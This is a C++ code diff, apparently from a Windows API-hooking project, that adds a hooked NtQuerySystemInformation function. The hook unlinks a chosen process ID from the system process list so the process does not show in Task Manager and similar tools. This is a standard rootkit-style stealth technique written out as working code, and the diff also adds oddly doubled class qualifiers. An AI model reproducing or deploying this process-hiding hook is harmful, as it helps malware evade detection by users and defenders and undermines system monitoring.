@@ -2,7 +2,7 @@
 #include "IATHooking.hpp"
 
 
-IATHooking::IATHooking(const std::string& module, const std::string & function_name, void * hook) :
+IATHooking::IATHooking::IATHooking(const std::string& module, const std::string & function_name, void * hook) :
 	_iat_entry(nullptr),
 	_original_function(nullptr)
 {
@@ -49,7 +49,7 @@ IATHooking::IATHooking(const std::string& module, const std::string & function_n
 	}
 }
 
-IATHooking::~IATHooking()
+IATHooking::IATHooking::~IATHooking()
 {
 	try
 	{
@@ -72,7 +72,42 @@ IATHooking::~IATHooking()
 	}
 }
 
-void * IATHooking::get_original_function()
+void * IATHooking::IATHooking::get_original_function()
 {
 	return _original_function;
+}
+
+NTSTATUS __stdcall IATHooking::HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+{
+	auto status = reinterpret_cast<pNtQuerySystemInformation>(g_NtQuerySystemInformation_hook->get_original_function())(
+		SystemInformationClass,
+		SystemInformation,
+		SystemInformationLength,
+		ReturnLength);
+
+	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
+	{
+		auto previous = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
+		auto current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
+
+		while (previous->NextEntryOffset)
+		{
+			if ((int)(current->UniqueProcessId) == g_hidden_pid)
+			{
+				if (current->NextEntryOffset)
+				{
+					previous->NextEntryOffset += current->NextEntryOffset;
+				}
+				else
+				{
+					previous->NextEntryOffset = 0;
+				}
+			}
+
+			previous = current;
+			current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
+		}
+	}
+
+	return status;
 }
